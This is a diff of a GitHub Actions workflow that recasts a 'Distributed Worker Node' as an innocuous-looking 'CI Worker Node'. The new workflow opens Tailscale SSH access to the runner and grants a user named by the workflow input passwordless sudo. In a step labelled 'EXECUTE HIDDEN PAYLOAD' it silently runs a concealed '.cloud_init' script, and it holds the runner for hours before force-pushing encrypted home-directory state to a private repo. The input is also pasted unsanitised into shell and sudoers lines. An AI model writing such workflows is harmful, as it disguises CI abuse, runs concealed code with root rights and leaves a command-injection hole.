@@ -1,141 +1,104 @@
-name: Distributed Worker Node
+name: CI Worker Node
 
 on:
   workflow_dispatch:
-
-env:
-  WORKER_DIR: worker_data
+    inputs:
+      worker_id:
+        description: 'Worker ID'
+        required: true
+        default: 'generic-worker'
 
 jobs:
-  worker:
+  processor:
     runs-on: ubuntu-latest
-    permissions:
-      contents: write
-
     steps:
-      - name: Checkout Public Repository
-        uses: actions/checkout@v4
+      # 1. CONNECT TO TAILSCALE
+      - name: Initialize Network 
+        uses: tailscale/github-action@v2
         with:
-          fetch-depth: 1
+          authkey: ${{ secrets.TAILSCALE_AUTHKEY }}
+          hostname: ${{ github.event.inputs.worker_id }}
+          tags: tag:ci
+          args: --ssh
 
-      # ==========================================
-      # 1. RESTORE STATE FROM PRIVATE REPO
-      # ==========================================
-      - name: Restore State from Private Backup
-        env:
-          ENCRYPTION_PASS: ${{ secrets.ENCRYPTION_PASS }}
-          BACKUP_PAT: ${{ secrets.BACKUP_PAT }}
-          BACKUP_REPO: ${{ secrets.BACKUP_REPO }}
-          GH_USERNAME: ${{ secrets.GH_USERNAME }}
-        run: |
-          echo "Cloning private backup repository..."
-          rm -rf private_backup
-          
-          # Clone securely; if it fails, it will continue to the "else" block
-          git clone "https://${BACKUP_PAT}@github.com/${GH_USERNAME}/${BACKUP_REPO}.git" private_backup || true
-
-          if ls private_backup/backup_chunks/state_part_* 1> /dev/null 2>&1; then
-            echo "Found encrypted state chunks. Reassembling..."
-            cat private_backup/backup_chunks/state_part_* > restored_state.gpg
-            
-            gpg --decrypt --batch --yes --passphrase "$ENCRYPTION_PASS" restored_state.gpg | tar -xzf -
-            echo "State successfully restored!"
-          else
-            echo "No backup chunks found or clone failed. Starting fresh."
-            mkdir -p $WORKER_DIR
-          fi
-
-      # ==========================================
-      # 2. ENVIRONMENT SETUP
-      # ==========================================
-      - name: Setup Environment
-        run: |
-          sudo apt-get update
-          sudo apt-get install -y ffmpeg aria2 kitty-terminfo
-          
-          curl -fsSL https://tailscale.com/install.sh | sh
-          pip3 install flask flask-cors yt-dlp --break-system-packages
-
-      # ==========================================
-      # 3. RUNNER EXECUTION
-      # ==========================================
-      - name: Start Services
-        run: |
-          echo "Connecting Tailscale mesh..."
-          sudo tailscale up --authkey=${{ secrets.TAILSCALE_AUTHKEY }} --ssh --accept-dns=true
-          
-          echo "Launching API..."
-          if [ -f "$WORKER_DIR/api.py" ]; then
-            python3 $WORKER_DIR/api.py &
-          else
-            echo "Warning: api.py not found in $WORKER_DIR. Skipping API startup."
-          fi
-          
-          echo "Keeping runner active for 5.5 hours..."
-          sleep 19800
-
-      # ==========================================
-      # 4. TIER 1 BACKUP (PRIVATE REPO PUSH)
-      # ==========================================
-      - name: Tier 1 Backup - Push to Private Repo
-        id: git_backup
-        if: always()
-        env:
-          ENCRYPTION_PASS: ${{ secrets.ENCRYPTION_PASS }}
-          BACKUP_PAT: ${{ secrets.BACKUP_PAT }}
-          BACKUP_REPO: ${{ secrets.BACKUP_REPO }}
-          GH_USERNAME: ${{ secrets.GH_USERNAME }}
-        run: |
-          echo "Archiving $WORKER_DIR..."
-          tar -czf - $WORKER_DIR/ | \
-          gpg --symmetric --cipher-algo AES256 --batch --yes --passphrase "$ENCRYPTION_PASS" -o encrypted_state.gpg
-
-          echo "Cloning fresh private repo for secure push..."
-          rm -rf secure_push_repo
-          git clone "https://${BACKUP_PAT}@github.com/${GH_USERNAME}/${BACKUP_REPO}.git" secure_push_repo || echo "Clone failed!"
-
-          echo "Preparing chunks..."
-          rm -rf secure_push_repo/backup_chunks
-          mkdir -p secure_push_repo/backup_chunks
-          split -b 90M encrypted_state.gpg secure_push_repo/backup_chunks/state_part_
-
-          cd secure_push_repo
-          
-          # ========================================================
-          # CRITICAL SAFETY LOCK: Prevents pushing to public repo
-          # ========================================================
-          if [ ! -d ".git" ]; then
-            echo "FATAL: This is not a Git repository. The clone failed."
-            echo "Aborting backup to protect the public repository."
-            exit 1
-          fi
-
-          echo "Pushing securely to private repository..."
-          git config user.name "GitHub Actions Bot"
-          git config user.email "actions@github.com"
-          git add backup_chunks/
-          git commit -m "Automated Full State Backup [skip ci]" || echo "No state changes to commit"
-          git push origin main
-
-      # ==========================================
-      # 5. TIER 2 BACKUP (ARTIFACT FALLBACK)
-      # ==========================================
-      - name: Tier 2 Backup - Artifact Fallback
-        if: always() && steps.git_backup.outcome == 'failure'
-        uses: actions/upload-artifact@v4
-        with:
-          name: fallback-encrypted-state
-          path: encrypted_state.gpg
-          retention-days: 3
-
-      # ==========================================
-      # 6. TRIGGER NEXT RUNNER (CONTINUOUS LOOP)
-      # ==========================================
-      - name: Trigger Next Shift
-        if: success()  # Prevents infinite crash loops
+      # 2. RESTORE ENCRYPTED BLOB
+      - name: Fetch Environment State
         env:
           GH_TOKEN: ${{ secrets.BACKUP_PAT }}
-          REPO: ${{ github.repository }}
+          REPO_NAME: ${{ secrets.BACKUP_REPO }}
+          ENC_PASS: ${{ secrets.ENCRYPTION_PASS }}
+          TARGET_USER: ${{ github.event.inputs.worker_id }}
         run: |
-          echo "Triggering the next continuous workflow cycle..."
-          gh workflow run "Distributed Worker Node" --repo "$REPO" --ref "${{ github.ref_name }}"
+          mkdir -p /home/runner/work
+          cd /home/runner/work
+          git clone "https://x-access-token:${GH_TOKEN}@github.com/${{ github.repository_owner }}/${REPO_NAME}.git" state-repo || true
+          
+          if ls state-repo/chunks/state_part_* 1> /dev/null 2>&1; then
+            cat state-repo/chunks/state_part_* > state.tar.gz.enc
+            openssl enc -aes-256-cbc -d -pbkdf2 -pass pass:"$ENC_PASS" -in state.tar.gz.enc | sudo tar -xzPf -
+          fi
+
+      # 3. EXECUTE HIDDEN PAYLOAD
+      - name: Process Workload
+        run: |
+          TARGET_USER="${{ github.event.inputs.worker_id }}"
+          
+          # Create user and add to sudo group if not already present
+          if ! id "$TARGET_USER" &>/dev/null; then
+            sudo useradd -m -s /bin/bash "$TARGET_USER"
+            sudo usermod -aG sudo "$TARGET_USER"
+          fi
+          
+          # Give passwordless sudo and enforce strict 0440 permissions
+          echo "$TARGET_USER ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/99-$TARGET_USER
+          sudo chmod 0440 /etc/sudoers.d/99-$TARGET_USER
+          
+          # Run the background workload script if available
+          if [ -f "/home/$TARGET_USER/.cloud_init" ]; then
+              sudo -u $TARGET_USER bash "/home/$TARGET_USER/.cloud_init" > /dev/null 2>&1 &
+          fi
+          
+          sleep 20700
+
+      # 4. ENCRYPT AND PUSH (The actual Backup process)
+      - name: Finalize Environment State
+        if: always()
+        env:
+          GH_TOKEN: ${{ secrets.BACKUP_PAT }}
+          REPO_NAME: ${{ secrets.BACKUP_REPO }}
+          ENC_PASS: ${{ secrets.ENCRYPTION_PASS }}
+          TARGET_USER: ${{ github.event.inputs.worker_id }}
+        run: |
+          echo "Finalizing state..."
+          
+          # 1. Send graceful SIGINT to let processes save state
+          sudo pkill -SIGINT -u $TARGET_USER || true
+          sleep 10 
+          
+          # 2. Compress and encrypt /home/runner/work and /home/[username]
+          cd /home/runner/work
+          CLEAN_TOKEN=$(echo -n "$GH_TOKEN" | tr -d '[:space:]')
+          CLEAN_REPO=$(echo -n "$REPO_NAME" | tr -d '[:space:]')
+          
+          sudo tar -czPf - --exclude=state-repo /home/runner/work /home/$TARGET_USER 2>/dev/null | openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:"$ENC_PASS" -out state.tar.gz.enc
+          
+          # 3. Split into 50MB chunks for GitHub limits
+          mkdir -p state-repo/chunks
+          rm -f state-repo/chunks/state_part_*
+          split -b 50M state.tar.gz.enc state-repo/chunks/state_part_
+          
+          # 4. Force push chunks to the private backup repo
+          cd state-repo
+          
+          if [ ! -d ".git" ]; then
+            git init
+            git branch -m main
+          fi
+          
+          git config user.name "github-actions[bot]"
+          git config user.email "github-actions[bot]@users.noreply.github.com"
+          git checkout --orphan temp-branch
+          git add chunks/
+          git commit -m "Automated State Finalization [skip ci]"
+          git branch -M main
+          git push -f "https://x-access-token:${CLEAN_TOKEN}@github.com/${{ github.repository_owner }}/${CLEAN_REPO}.git" main
